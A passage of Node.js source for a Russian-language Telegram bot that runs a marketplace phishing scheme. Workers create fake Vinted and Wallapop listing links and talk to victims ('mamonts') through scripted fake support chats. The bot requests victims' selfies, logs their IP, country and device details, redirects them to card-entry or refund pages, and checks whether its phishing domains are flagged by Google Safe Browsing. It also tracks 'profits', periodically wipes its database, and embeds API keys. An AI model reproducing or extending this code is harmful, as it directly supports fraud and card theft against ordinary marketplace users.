const auth = require("./middlewares/auth");
const requests = require("./middlewares/requests");
const referralMiddleware = require("./middlewares/referral");

const stage = require("./scenes");
const session = require("telegraf/session");
const settingsMiddleware = require("./middlewares/settings");
const admin = require("./admin");
const web = require("./web/server");
const ads = require("./commands/admin/ads");

const menu = require("./commands/menu");
const menu2 = require("./commands/menu2");

const user = require("./commands/admin/user");
const rand = require("./helpers/rand");

const format_tp = require("./commands/format_tp");

const menume = require("./commands/menume");

const media_profit = require("./commands/media_profit");

const autoTp = require("./commands/autoTp");
const mydomains = require("./commands/MyDomains");
const mytags = require("./commands/MyTags");
const wallet = require("./commands/wallet");
const faker = require("faker"); // Используем faker для генерации данных

const fs = require("fs");

const path = require("path");
const WebSocket = require("ws");

const { wss, clients } = require("./web/server");
const {
  generateFakeProfile,
  supportedCountries,
} = require("./helpers/fakeProfile");

const cron = require("node-cron");

const { backupProcess } = require("./backup");

if (process.env.CRON_ENABLED === "true") {
  // Выполняется каждый день в 1:00 ночи
  cron.schedule(
    "0 0 * * *", // каждый день в 00:00
    () => {
      console.log(
        `⏰ [${new Date().toISOString()}] Starting scheduled backup...`
      );
      backupProcess();
    },
    {
      timezone: "Europe/Moscow", // Учитываем киевское время
    }
  );

  // console.log('✅ Cron is enabled and scheduled for 1:00 AM!');
} else {
  // console.log('⏸️ Cron is disabled via .env (CRON_ENABLED=false)');
}

const updateCurrencyRates = require("./helpers/currencyUpdater"); // путь к файлу

cron.schedule(
  "0 0 * * *", // каждый день в 00:00
  async () => {
    // console.log("🕐 Крон (Kyiv): запускаем обновление курсов");
    await updateCurrencyRates();
  },
  {
    timezone: "Europe/Moscow", // 👈 таймзона Киева
  }
);

const {
  BlockCards,
  Writer,
  Country,
  Ad,
  User,
  Settings,
  Nastavniki,
  Profit,
  SupportChat,
  Support,
  SupportTemp,
  Profiles,
  Service,
  Operators,
  MyDomains,
  AutoTp,
  Log,
  Referral,
  IpBinding,
} = require("./database");
const operators = require("./commands/operators");

const writers = require("./commands/writers");
const teachers = require("./commands/teachers");
const createLink = require("./commands/createLink");
const createLink1 = require("./commands/createLink1");

const createLinkCountry = require("./commands/createLinkCountry");
const createLinkCountry1 = require("./commands/createLinkCountry1");

const myAds = require("./commands/myAds");
const myAd = require("./commands/myAd");
const myCreateAd = require("./commands/myCreateAd");

const log = require("./helpers/log");
const { Sequelize } = require("./models");
const binInfo = require("./helpers/binInfo");
const myProfits = require("./commands/myProfits");
const myProfit = require("./commands/myProfit");
const settings = require("./commands/settings");
const settingsMedia = require("./commands/settingsMedia");

const notifications = require("./commands/notifications");

const workersTop = require("./commands/workersTop");
const workersTop1 = require("./commands/workersTop1");

const locale = require("./locale");
const moment = require("moment");
const { Op, BIGINT } = require("sequelize");
const supportTemps = require("./commands/supportTemp");
const profiles = require("./commands/profiles");

const supports = require("./commands/supports");

const axios = require("axios");
const chunk = require("chunk");

require("dotenv").config();

const { Telegraf, Markup } = require("telegraf"),
  bot = new Telegraf(process.env.BOT_TOKEN);
process.on("unhandledRejection", (reason, promise) => {
  console.error("❌ [UnhandledRejection]:", reason);
});

process.on("uncaughtException", (err) => {
  console.error("❌ [UncaughtException]:", err);
});
async function autoCleanDatabase(bot) {
  try {
    const setting = await Settings.findOne(); // Просто первую запись

    if (!setting || !setting.auto_clean_db) return; // если выключено — выйти

    // Считаем всё заранее
    const adsCount = await Ad.count();
    const supportChatCount = await SupportChat.count();
    const blockCardsCount = await BlockCards.count();
    const supportCount = await Support.count(); // 🆕 считаем записи Support

    // Удаляем всё
    await Ad.destroy({ where: {} });
    await SupportChat.destroy({ where: {} });
    await BlockCards.destroy({ where: {} });
    await Support.destroy({ where: {} }); // 🆕 очищаем Support тоже

    const text =
      `🧹 <b>Автоочистка базы данных</b>\n\n` +
      `🗑 Удалено:\n` +
      `- Объявлений: <b>${adsCount}</b>\n` +
      `- Чатов поддержки: <b>${supportChatCount}</b>\n` +
      `- Заблокированных карт: <b>${blockCardsCount}</b>\n` +
      `- Записей Support: <b>${supportCount}</b>\n\n` + // 🆕 добавил в текст
      `🕐 Время: <b>${moment().format("DD.MM.YYYY HH:mm")}</b>`;

    await bot.telegram.sendMessage(setting.loggingGroupId, text, {
      parse_mode: "HTML",
    });

    console.log(
      "✅ Автоочистка базы завершена успешно и отправлена в лог-группу"
    );
  } catch (err) {
    console.error("❌ Ошибка автоочистки базы:", err);
  }
}
cron.schedule(
  "0 5 */5 * *", // каждые 5 дней в 05:00 утра
  async () => {
    console.log(
      "⏰ Запуск автоочистки базы данных каждые 5 дней в 05:00 утра..."
    );
    await autoCleanDatabase(bot);
  },
  {
    timezone: "Europe/Moscow", // Временная зона
  }
);

bot.use(async (ctx, next) => {
  try {
    await next();
  } catch (err) {
    console.error("❌ Ошибка в middleware:", err);
    await ctx.reply("❌ Произошла внутренняя ошибка. Разработчик уже уведомлён.");
  }
});


bot.catch((err, ctx) => {
  console.error("❌ Ошибка в боте:", err);
  if (err.code === 400 && err.description.includes("query is too old")) {
    console.warn("⚠️ Callback_query устарел, продолжаем работу...");
    return;
  }
  ctx.reply("❌ Произошла ошибка. Попробуйте позже.");
});
bot.action(/^edit_ad_(\d+)$/, async (ctx) => {
  const adId = ctx.match[1];
  try {
    const ad = await Ad.findOne({ where: { id: adId, userId: ctx.from.id } });
    if (!ad) {
      return ctx.answerCbQuery("❌ Объявление не найдено", { show_alert: true });
    }

    await ctx.editMessageText(`Редактирование объявления <b>#id${ad.id}</b>`, {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("🏷 Название", `my_ad_${ad.id}_edit_title`),
        Markup.callbackButton("💰 Цена", `my_ad_${ad.id}_edit_price`)],
        [Markup.callbackButton("👤 Имя", `my_ad_${ad.id}_edit_name`),
        Markup.callbackButton("🏠 Адрес", `my_ad_${ad.id}_edit_address`)],

        [Markup.callbackButton("◀️ Назад", `my_ad_${ad.id}`)],
      ]),
    });
  } catch (err) {
    console.error("Ошибка при открытии меню редактирования:", err);
    return ctx.reply("❌ Ошибка");
  }
});
bot.on("new_chat_members", async (ctx) => {
  try {
    var users = ctx.message.new_chat_members;
    const settings = await Settings.findByPk(1);
    if (ctx.chat.id !== settings.allGroupId) return;
    users.map(async (v) => {
      const user = await User.findByPk(v.id, {
        include: [
          {
            association: "request",
          },
        ],
      });
      if (
        !user ||
        user?.banned ||
        !user?.request ||
        user?.request?.status !== 1
      )
        return ctx.telegram
          .kickChatMember(ctx.chat.id, v.id)
          .catch((err) => err);
      if (!settings.allHelloMsgEnabled) return;
      var text = locale.newChatMemberText;
      text = text.replace(
        `{username}`,
        `<b><a href="tg://user?id=${user.id}">${user.username}</a></b>`
      );
      ctx
        .reply(text, {
          parse_mode: "HTML",
          reply_markup: settings.payoutsChannelLink
            ? Markup.inlineKeyboard([
              [Markup.urlButton(locale.payouts, settings.payoutsChannelLink)],
            ])
            : {},
        })
        .catch((err) => err);
    });
  } catch (err) { }
});
bot.use((ctx, next) => {
  return next();
});
bot.use(session());
bot.use(settingsMiddleware);
bot.use(auth);
// bot.use(referralMiddleware);
bot.use(stage.middleware());
// В сцене или в action'ах:
const guideText = `<b>📌 Переменные для замены</b>\n\n` +
  `<i>В шаблоне вы можете использовать переменные — они автоматически заменяются на реальные данные из объявления:</i>\n\n` +
  `<code>{title}</code> — Название товара\n` +
  `<code>{price}</code> — Стоимость товара\n` +
  `<code>{address}</code> — Адрес доставки\n` +
  `<code>{name}</code> — Инициалы получателя/отправителя\n` +
  `<code>{id}</code> — ID объявления / трек-номера\n\n` +
  `<b>Пример:</b> <i>Ваш товар <b>{title}</b> был оплачен на сумму <b>{price}</b>, ` +
  `вам необходимо прийти в отделение почты и назвать номер <b>{id}</b> для отправки ` +
  `заказа на адрес <b>{address}</b> к получателю <b>{name}</b></i>\n\n` +
  `<b>#️⃣ Форматирование текста</b>\n\n` +
  `<code>&lt;b&gt;Жирный текст&lt;/b&gt;</code>\n` +
  `<code>&lt;i&gt;Курсивный текст&lt;/i&gt;</code>\n` +
  `<code>&lt;u&gt;Подчеркнутый&lt;/u&gt;</code>\n\n` +
  `<code>&lt;a href='https://example.com'&gt;Гипер ссылка&lt;/a&gt;</code>\n` +
  `<code>&lt;b&gt;&lt;a href='https://example.com'&gt;Гипер жирная ссылка&lt;/a&gt;&lt;/b&gt;</code>\n\n` +
  `⚠️ <b>Важно:</b> закрывайте HTML-теги, иначе шаблон не сработает!`;

bot.action(/^(open|close)_(auto_tp|support_temp)_guide$/, async (ctx) => {
  const [, action, context] = ctx.match; // например: ["open_support_temp_guide", "open", "support_temp"]

  await ctx.answerCbQuery().catch(() => { });

  if (action === "open") {
    return ctx.editMessageText(guideText, {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("◀️ Вернуться к шаблонам", `close_${context}_guide`)],
      ]),
    });
  }

  // Закрыть — вызываем соответствующий модуль
  if (context === "auto_tp") return require("./commands/autoTp")(ctx);
  if (context === "support_temp") return require("./commands/supportTemp")(ctx);
});
bot.action("toggle_offline_show", async (ctx) => {
  ctx.match = ["", "show"];
  require("./commands/supports")(ctx);
});

bot.action("toggle_offline_hide", async (ctx) => {
  ctx.match = ["", "hide"];
  require("./commands/supports")(ctx);
});
bot.action(/^dialog_writer_(\d+)$/, async (ctx) => {
  try {
    const supportId = ctx.match[1];

    const support = await Support.findOne({
      where: { id: supportId },
      include: [
        { association: "messages", order: [["id", "ASC"]] },
        { association: "ad" },
      ],
    });

    if (!support || !support.ad) {
      return ctx.reply("❌ Объявление не найдено.");
    }

    if (!support.messages.length) {
      return ctx.answerCbQuery("❌ В диалоге пока нет сообщений.", true);
    }

    let dialogueText = "";
    for (const msg of support.messages) {
      const sender = msg.messageFrom === 0 ? "👨🏼‍💻" : "🦣";
      const date = new Date(msg.createdAt).toLocaleString("ru-RU", {
        day: "2-digit",
        month: "2-digit",
        year: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      });

      if (msg.message.match(/\.(jpeg|jpg|png|gif|webp)$/i)) {
        if (msg.messageFrom === 1) {
          dialogueText += `${sender} [${date}]: [Фото] ${msg.message}\n\n`;
        } else {
          dialogueText += `${sender} [${date}]: [Фото]\n\n`;
        }
      } else {
        dialogueText += `${sender} [${date}]: ${msg.message}\n\n`;
      }
    }

    await ctx.answerCbQuery();

    const hideKeyboard = Markup.inlineKeyboard([
      [Markup.callbackButton("❌ Скрыть", "delete")],
    ]);

    if (dialogueText.length < 4096) {
      return ctx.reply(`<blockquote>${dialogueText}</blockquote>`, {
        parse_mode: "HTML",
        disable_web_page_preview: true,
        reply_markup: hideKeyboard,
      });
    } else {
      const fileName = `dialogue_${support.ad.id}.txt`;
      const filePath = path.join(__dirname, fileName);
      fs.writeFileSync(filePath, dialogueText);

      await ctx.replyWithDocument(
        { source: filePath, filename: fileName },
        {
          reply_markup: hideKeyboard,
        }
      );

      fs.unlinkSync(filePath);
    }
  } catch (err) {
    console.error("Ошибка при загрузке диалога:", err);
    return ctx.reply("❌ Ошибка при загрузке диалога.");
  }
});

bot.action(/^dialog_(\d+)$/, async (ctx) => {
  try {
    const supportId = ctx.match[1];
    const requestingUserId = Number(ctx.from.id);

    const support = await Support.findOne({
      where: { id: supportId },
      include: [
        { association: "messages", order: [["id", "ASC"]] },
        { association: "ad" },
      ],
    });

    if (!support || !support.ad) {
      return ctx.reply("❌ Объявление не найдено.");
    }

    const owner = await User.findOne({
      where: { id: support.ad.userId },
    });

    if (!owner) {
      return ctx.reply("❌ Владелец объявления не найден.");
    }

    const operatorId = Number(owner.operator);
    const ownerId = Number(owner.id);

    if (owner.operator) {
      if (requestingUserId !== operatorId) {
        return ctx.answerCbQuery(
          "❌ Диалог недоступен. В целях конфиденциальности оператора.",
          true
        );
      }
    } else {
      if (requestingUserId !== ownerId) {
        return ctx.answerCbQuery("❌ У вас нет доступа к этому диалогу.", true);
      }
    }

    if (!support.messages.length) {
      return ctx.answerCbQuery("❌ В диалоге пока нет сообщений.", true);
    }

    let dialogueText = "";
    for (const msg of support.messages) {
      const sender = msg.messageFrom === 0 ? "👨🏼‍💻" : "🦣";
      const date = new Date(msg.createdAt).toLocaleString("ru-RU", {
        day: "2-digit",
        month: "2-digit",
        year: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      });

      if (msg.message.match(/\.(jpeg|jpg|png|gif|webp)$/i)) {
        if (msg.messageFrom === 1) {
          dialogueText += `${sender} [${date}]: [Фото] ${msg.message}\n\n`;
        } else {
          dialogueText += `${sender} [${date}]: [Фото]\n\n`;
        }
      } else {
        dialogueText += `${sender} [${date}]: ${msg.message}\n\n`;
      }
    }

    await ctx.answerCbQuery();

    const hideKeyboard = Markup.inlineKeyboard([
      [Markup.callbackButton("❌ Скрыть", "delete")],
    ]);

    if (dialogueText.length <= 4096) {
      return ctx.reply(`<blockquote>${dialogueText}</blockquote>`, {
        parse_mode: "HTML",
        disable_web_page_preview: true,
        reply_markup: hideKeyboard,
      });
    } else {
      // Сохраняем как временный файл
      const fileName = `dialogue_${support.ad.id}.txt`;
      const filePath = path.join("/tmp", fileName);
      fs.writeFileSync(filePath, dialogueText);

      await ctx.replyWithDocument(
        { source: filePath, filename: fileName },
        {
          reply_markup: hideKeyboard,
        }
      );
      // Можно удалить файл после отправки, если не нужен
      fs.unlinkSync(filePath);
    }
  } catch (err) {
    console.error("Ошибка при загрузке диалога:", err);
    return ctx.reply("❌ Ошибка при загрузке диалога.");
  }
});
bot.action(/request_selfie_(\d+)/, async (ctx) => {
  const adId = ctx.match[1];

  const client = clients.get(adId); // 👈 Теперь отправляем только нужному клиенту
  if (client && client.readyState === WebSocket.OPEN) {
    client.send(JSON.stringify({ action: "request_selfie", adId: adId }));

    await ctx.replyWithHTML(
      `<b>📸 Запрос на селфи отправлен.</b>\n\n<i>⏳ Как только мамонт примет запрос на разрешение, вы сразу же получите его.</i>`,
      { reply_to_message_id: ctx.callbackQuery.message.message_id }
    );
  } else {
    await ctx.answerCbQuery("⚠️ Мамонт не в сети. Запрос невозможен!", true);
  }
});
bot.action(/^edit_support_message_(\d+)$/, async (ctx) => {
  try {
    const messageId = ctx.match[1];

    const message = await SupportChat.findOne({
      where: { id: messageId },
      include: [{ association: "support", required: true }],
    });

    if (!message || !message.support) {
      return ctx.answerCbQuery("❌ Сообщение или поддержка не найдены", { show_alert: true });
    }

    const adId = message.support.adId;

    await ctx.answerCbQuery();
    return ctx.scene.enter("scene_edit_support_message", {
      editMessageId: messageId,
      adId: adId,

    });
  } catch (err) {
    console.error("❌ Ошибка при переходе к сцене редактирования:", err);
    return ctx.answerCbQuery("❌ Ошибка при обработке.");
  }
});
bot.action(/^delete_support_message_(\d+)$/, async (ctx) => {
  try {
    const messageId = ctx.match[1];

    // Проверяем наличие сообщения
    const deletedMessage = await SupportChat.findOne({
      where: { id: messageId },
    });
    if (!deletedMessage) {
      return ctx.answerCbQuery("❌ Сообщение уже удалено или не найдено.");
    }

    // Удаляем сообщение из базы данных
    await SupportChat.destroy({ where: { id: messageId } });

    // Удаляем сообщение из Telegram-чата
    await ctx
      .editMessageText("<b>❌ Сообщение удалено</b>", {
        parse_mode: "HTML",
      })
      .catch((err) => {
        console.error("Ошибка при редактировании сообщения:", err);
        throw err;
      });
    // Отправляем уведомление клиентам через WebSocket
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({ type: "delete", messageId }));
      }
    });

    await ctx.answerCbQuery("✅ Сообщение удалено.");
  } catch (err) {
    console.error("Ошибка при удалении сообщения:", err);
    return ctx.answerCbQuery("❌ Ошибка при удалении.");
  }
});
bot.action(/^open_support_(\d+)$/, async (ctx) => {
  const adId = Number(ctx.match[1]);
  const ad = await Ad.findByPk(adId, {
    include: [{ association: "user" }],
  });

  if (!ad || !ad.user) {
    return ctx.answerCbQuery("❌ Объявление не найдено", true);
  }

  // Если пользователь — воркер и у него есть оператор — запретить
  if (ctx.from.id === ad.userId && ad.user.operator) {
    return ctx.answerCbQuery("❌ Для этого у тебя есть оператор", true);
  }

  // Иначе открыть чат
  const status = "open";
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN && client.adId == adId) {
      client.send(JSON.stringify({
        type: "support_status",
        status,
        adId,
      }));
    }
  });

  await ctx.answerCbQuery("Чат поддержки открыт");
});


bot.action(/^close_support_(\d+)$/, async (ctx) => {
  const adId = Number(ctx.match[1]);
  const ad = await Ad.findByPk(adId, {
    include: [{ association: "user" }],
  });

  if (!ad || !ad.user) {
    return ctx.answerCbQuery("❌ Объявление не найдено", true);
  }

  // Если пользователь — воркер и у него есть оператор — запретить
  if (ctx.from.id === ad.userId && ad.user.operator) {
    return ctx.answerCbQuery("❌ Для этого у тебя есть оператор", true);
  }

  const status = "closed";
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN && client.adId == adId) {
      client.send(JSON.stringify({
        type: "support_status",
        status,
        adId,
      }));
    }
  });

  await ctx.answerCbQuery("Чат поддержки закрыт");
});
const geoip = require("geoip-lite");
const { getName } = require("country-list");

global.mamontInfoMap = new Map();

bot.action(/^mamont_info_(\d+)$/, async (ctx) => {
  try {
    const adId = ctx.match[1];
    const info = global.mamontInfoMap.get(adId);

    if (!info) {
      return ctx.answerCbQuery("❌ Информация ещё не получена", { show_alert: true });
    }


    // Определение страны
    let country = "неизвестна";
    if (info.ip) {
      const geo = geoip.lookup(info.ip);
      if (geo?.country) {
        country = getName(geo.country) || geo.country;
      }
    }

    const msg = `
🖥️ <b>Информация об устройстве</b>:

🌍 IP: <b>${info.ip || "неизвестно"}</b>
🏳️ Страна: <b>${country}</b>
🧭 Язык: <b>${info.language || "неизвестно"}</b>
📱 Устройство: <b>${info.platform || "неизвестно"}</b>
📐 Экран: <b>${info.screen?.width || "?"}x${info.screen?.height || "?"}</b>
🕵️ User-Agent: <i>${info.userAgent || "неизвестно"}</i>
    `.trim();

    await ctx.reply(msg, {
      parse_mode: "HTML",
      reply_to_message_id: ctx.update.callback_query.message.message_id,
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("❌ Скрыть", "delete")]
      ])
    });

  } catch (err) {
    console.error("Ошибка при обработке mamont_info:", err);
    return ctx.answerCbQuery("❌ Ошибка при получении данных", { show_alert: true });
  }
});



bot.action(/^more_actions_(\d+)_(\d+)$/, async (ctx) => {
  const adId = ctx.match[1];
  const supportId = ctx.match[2];

  const ad = await Ad.findByPk(adId, {
    include: [{ association: "user" }]
  });
  const support = await Support.findByPk(supportId);
  const user = ad.user;

  const isOperator = user?.operator == ctx.from.id;

  const keyboard = [];



  keyboard.push([Markup.callbackButton("👁️ Онлайн", `check_mamont_${ad.id}`)]);



  keyboard.push([
    Markup.callbackButton(
      isOperator ? "✍️ Ответить за воркера" : "✍️ Сообщение в ТП",
      isOperator
        ? `operatorSend_${support.id}_send_message_${user.id}`
        : `support_${support.id}_send_message`
    ),
    Markup.callbackButton("📋 Шаблоны ТП", `tempSupport_${support.id}_${user.id}`)
  ]);
  keyboard.push([
    Markup.callbackButton("🔓 Открыть ТП", `open_support_${ad.id}`),
    Markup.callbackButton("🔒 Закрыть ТП", `close_support_${ad.id}`)
  ]);
  keyboard.push([
    Markup.callbackButton("📸 Селфи", `request_selfie_${ad.id}`),
    Markup.callbackButton("🗨️ Диалог", `dialog_${support.id}`)
  ]);
  keyboard.push([
    Markup.callbackButton("🖥️ Информация об устройстве", `mamont_info_${ad.id}`)
  ]);  keyboard.push([
    Markup.callbackButton("🗑️ Удалить объявление", `delete_ad1_${ad.id}`)
  ]);




keyboard.push([
  Markup.callbackButton("🔗 На главную", `redirect_main_${ad.id}`),
  Markup.callbackButton("💳 На карту", `redirect_card_${ad.id}`),
]);
 keyboard.push([

  Markup.callbackButton("↩️ На возврат", `redirect_refund_${ad.id}`)
]);

  keyboard.push([
    Markup.callbackButton("🔼 Свернуть", `back_to_main_${ad.id}_${support.id}`)
  ]);

  await ctx.editMessageReplyMarkup(Markup.inlineKeyboard(keyboard));
});

bot.action(/^back_to_main_(\d+)_(\d+)$/, async (ctx) => {
  const adId = ctx.match[1];
  const supportId = ctx.match[2];

  const ad = await Ad.findByPk(adId, {
    include: [{ association: "user" }]
  });
  const support = await Support.findByPk(supportId);
  const user = ad.user;

  const isOperator = user?.operator == ctx.from.id;

  const keyboard = [];


  keyboard.push([Markup.callbackButton("👁️ Онлайн", `check_mamont_${ad.id}`)]);



  keyboard.push([
    Markup.callbackButton(
      isOperator ? "✍️ Ответить за воркера" : "✍️ Сообщение в ТП",
      isOperator
        ? `operatorSend_${support.id}_send_message_${user.id}_${ad.id}`
        : `support_${support.id}_send_message`
    ),
    Markup.callbackButton("📋 Шаблоны ТП", `tempSupport_${support.id}_${user.id}`)
  ]);
  keyboard.push([
    Markup.callbackButton("🔓 Открыть ТП", `open_support_${ad.id}`),
    Markup.callbackButton("🔒 Закрыть ТП", `close_support_${ad.id}`)
  ]);
  keyboard.push([
    Markup.callbackButton("🔽 Дополнительно", `more_actions_${ad.id}_${support.id}`)
  ]);

  await ctx.editMessageReplyMarkup(Markup.inlineKeyboard(keyboard));
});

bot.action(/^redirect_(main|card|refund)_(\d+)$/, async (ctx) => {
  const type = ctx.match[1]; // main, card или refund
  const adId = ctx.match[2];

  const ad = await Ad.findByPk(adId, {
    include: [{ association: "user" }],
  });

  if (!ad || !ad.user) {
    return ctx.answerCbQuery("❌ Объявление не найдено", true);
  }

  // 🚫 Блокировка: если это воркер, и у него есть оператор
  if (ctx.from.id === ad.userId && ad.user.operator) {
    return ctx.answerCbQuery("❌ Для этого у тебя есть оператор", true);
  }

  const targetUrl = {
    main: `/${adId}`,
    card: `/ad/${adId}`,
    refund: `/refund/${adId}`,
  }[type];

  const clientObj = clients.get(adId);
  const ws = clientObj?.ws || clientObj;

  if (ws?.readyState === 1) {
    ws.send(JSON.stringify({ type: "redirect", url: targetUrl }));
    await ctx.answerCbQuery("✅ Перенаправление отправлено.");
  } else {
    await Ad.update({ pendingRedirect: targetUrl }, { where: { id: adId } });
    await ctx.answerCbQuery("🕓 Мамонт не в сети. Редирект выполнится при следующем входе.",true);
  }
});


// Глобальная Map для хранения информации о мамонтах по adId

bot.action(/^test_domain_kt_(\d+)$/, async (ctx) => {
  try {
    const ad = await Ad.findOne({
      where: { id: ctx.match[1], userId: ctx.from.id },
    });

    if (!ad)
      return ctx.answerCbQuery("❌ Объявление не найдено.", {
        show_alert: true,
      });

    const service = await Service.findOne({ where: { code: ad.serviceCode } });

    if (!service)
      return ctx.answerCbQuery("❌ Сервис не найден.", { show_alert: true });

    const checks = [];

    if (service.domain) {
      checks.push({ label: "🔗 Общий домен", domain: service.domain });
    }
    if (ad.shortLink) {
      checks.push({ label: "✂️ Сокращалка", domain: ad.shortLink });
    }
    if (ad.myDomainLink) {
      checks.push({ label: "🌐 Личный домен", domain: ad.myDomainLink });
    }

    if (checks.length === 0) {
      return ctx.answerCbQuery("❗ Нет доменов для проверки.", {
        show_alert: true,
      });
    }

    const apiKey = "AIzaSyAlAOFDNMYOWuSCrOuqejFpvuHBfGn-LUs"; // Твой API ключ
    const safeBrowsingUrl = `https://safebrowsing.googleapis.com/v4/threatMatches:find?key=${apiKey}`;

    const requestData = {
      client: { clientId: "your-bot", clientVersion: "1.0" },
      threatInfo: {
        threatTypes: ["MALWARE", "SOCIAL_ENGINEERING", "UNWANTED_SOFTWARE"],
        platformTypes: ["ANY_PLATFORM"],
        threatEntryTypes: ["URL"],
        threatEntries: checks.map((c) => ({ url: `https://${c.domain}` })),
      },
    };

    const response = await axios.post(safeBrowsingUrl, requestData);

    const badUrls = (response.data?.matches || []).map(
      (match) => match.threat.url
    );

    let resultText = "";

    for (const check of checks) {
      const url = `https://${check.domain}`;
      if (badUrls.includes(url)) {
        resultText += `${check.label}: 🚨 Опасный\n`;
      } else {
        resultText += `${check.label}: ✅ Безопасный\n`;
      }
    }

    await ctx.answerCbQuery(resultText.trim(), true);
  } catch (error) {
    console.error("❌ Ошибка при проверке доменов:", error.message);
    await ctx.answerCbQuery("❌ Ошибка при проверке доменов.", {
      show_alert: true,
    });
  }
});
bot.command("del", async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.reply(
      "Эта команда доступна только в личных сообщениях с ботом."
    );
  }
  return ctx.scene.enter("delete_ad");
});

bot.action(/^operator_(\d+)$/, async (ctx) => {
  try {
    const id = ctx.match[1];
    const operator = await Operators.findOne({ where: { id: id } });

    if (!operator) {
      return ctx.reply("❌ Оператор не найден").catch((err) => err);
    }

    const profitsCount = await Profit.count({
      where: {
        operator: operator.userId,
      },
    });

    const profitsSum = await Profit.sum("amount", {
      where: {
        operator: operator.userId,
      },
    });

    const profitsTotal = profitsSum ? profitsSum.toFixed(2) : "0.00";

    // 👨🏼‍💻 Считаем количество воркеров (пользователей, у которых выбран этот оператор)
    const workersCount = await User.count({
      where: {
        operator: operator.userId,
      },
    });

    // 📅 Дата добавления оператора (из поля createdAt)
    const createdAt = operator.createdAt
      ? new Date(operator.createdAt).toLocaleDateString("ru-RU")
      : "неизвестно";

    await ctx.answerCbQuery("👨🏼‍💻 Получаю оператора ").catch((err) => err);

    return ctx
      .replyOrEdit(
        `👨🏼‍💻 Оператор: <b>${operator.username ? `@${operator.username}` : `ID: ${operator.id}`
        }</b> ${operator.percent == null
          ? "(Процент не указан)"
          : `<b>${operator.percent}%</b>`
        }

<blockquote>Кол-во профитов: <b>${profitsCount}</b>
Общая сумма профитов: <b>${profitsTotal} USD</b>
Количество воркеров: <b>${workersCount}</b>
Дата добавления: <b>${createdAt}</b>

Описание: <b>${operator.about == null ? "не указано" : operator.about
        }</b></blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "✅ Выбрать оператора",
                `operator_select_${id}`
              ),
            ],
            [Markup.callbackButton("◀️ Назад", `supports`)],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("add_my_domains", async (ctx) => {
  return ctx.scene.enter("add_my_domains");
});

bot.hears(
  /^https:\/\/www\.vinted\.co\.uk\/items\/(\d+)-([\w-]+)/,
  async (ctx) => {
    const vintedUrl = ctx.match[0];

    ctx.scene.state.vintedUrl = vintedUrl;

    await ctx.scene.enter("create_link_vinted_uk_link");
  }
);

bot.action("settings_media", settingsMedia);

bot.hears(/^https:\/\/www\.vinted\.es\/items\/(\d+)-([\w-]+)/, async (ctx) => {
  const vintedUrl = ctx.match[0];

  ctx.scene.state.vintedUrl = vintedUrl;

  await ctx.scene.enter("create_link_vinted_es_link");
});

bot.hears(
  /^https:\/\/(es\.)?wallapop\.com\/item\/[\w-]+-(\d+)/,
  async (ctx) => {
    const wallapopUrl = ctx.match[0]; // полная ссылка (с es. или без)

    ctx.scene.state.wallapopUrl = wallapopUrl;

    await ctx.scene.enter("create_link_wallapop_es_link");
  }
);

bot.action("settings_my_tags", mytags);
bot.action("auto_my_tags", async (ctx) => {
  return ctx.scene.enter("auto_my_tags");
});

bot.action("set_profit_media", media_profit);

// Запуск сцены установки нового изображения
bot.action("start_set_profit_media", async (ctx) => {
  return ctx.scene.enter("set_profit_media");
});

bot.action("delete_profit_media", async (ctx) => {
  try {
    // Удаляем медиафайл и его тип из базы данных
    await User.update(
      { media: null, media_type: null },
      { where: { id: ctx.from.id } }
    );

    // Отправляем уведомление пользователю
    await ctx.answerCbQuery("✅ Оформление профита успешно удалено.", {
      show_alert: false,
    });

    // Возвращаем пользователя в меню настроек медиа
    return media_profit(ctx);
  } catch (err) {
    console.error("Ошибка при удалении оформления профита:", err);
    await ctx
      .reply("❌ Ошибка при удалении оформления")
      .catch((err) => console.error("Ошибка отправки сообщения:", err));
  }
});

bot.action("add_my_tags", async (ctx) => {
  return ctx.scene.enter("add_my_tags");
});
bot.action(/^generate_qr_(\w+)$/, async (ctx) => {
  try {
    const ad = await Ad.findOne({ where: { id: ctx.match[1] } });
    const service = await Service.findOne({
      where: {
        code: ad.serviceCode,
      },
    });
    if (!ad) {
      return ctx.reply("❌ Объявление не найдено");
    }

    // Здесь предполагаем, что мы используем URL объявления для QR-кода

    const options = {
      method: "GET",
      url: "https://qrcode-monkey.p.rapidapi.com/qr/custom",
      params: {
        data: `https://${service.domain}/${ad.id}`, // Замените URL на ваш текст или URL
        config: JSON.stringify({
          bodyColor: "#F1641E",
          eye1Color: "#F1641E",
          eye2Color: "#F1641E",
          eye3Color: "#F1641E",
          eyeBall1Color: "#F1641E",
          eyeBall2Color: "#F1641E",
          eyeBall3Color: "#F1641E",
          body: "square", // Вы можете изменить это на другой стиль, если хотите
          logo: "https://cdn-icons-png.flaticon.com/512/3670/3670121.png", // Ссылка на ваше лого
          // Другие параметры конфигурации
        }),
        download: "true",
        file: "png",
        size: "600",
      },
      headers: {
        "X-RapidAPI-Key": "b610e84089mshc17c1233736e15fp1cea94jsn61fa42e5e870",
        "X-RapidAPI-Host": "qrcode-monkey.p.rapidapi.com",
      },
      responseType: "arraybuffer", // Указываем, что ожидаем бинарные данные
    };

    const response = await axios.request(options);
    const caption = "<b>✅ QR-Code успешно сгенерирован.</b>"; // Установите подпись к фото
    await ctx.replyWithPhoto(
      { source: Buffer.from(response.data) },
      {
        caption: caption,
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("❌ ", `delete`)],
        ]),
      }
    );
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка при генерации QR-кода").catch((err) => err);
  }
});
bot.action(/^generate_qr2_(\w+)$/, async (ctx) => {
  try {
    const ad = await Ad.findOne({ where: { id: ctx.match[1] } });
